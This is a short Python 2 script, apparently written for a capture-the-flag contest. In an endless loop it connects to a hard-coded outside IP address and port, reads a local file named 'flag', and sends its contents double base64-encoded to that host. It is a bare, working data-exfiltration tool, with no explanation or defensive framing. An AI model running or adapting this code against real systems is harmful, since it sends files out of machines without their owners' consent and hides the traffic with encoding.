import socket,base64,time
target_host="172.5.70.157"
target_port=9999
f=0
client= 0
while True:
    time.sleep(1)
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)            
    client.connect((target_host,target_port))
    try:
        f = open('./flag', 'r')
        data = f.readline()
        print data
        client.send( base64.b64encode(base64.b64encode(data)))           
    finally:
        if f:
            f.close()                                                                               

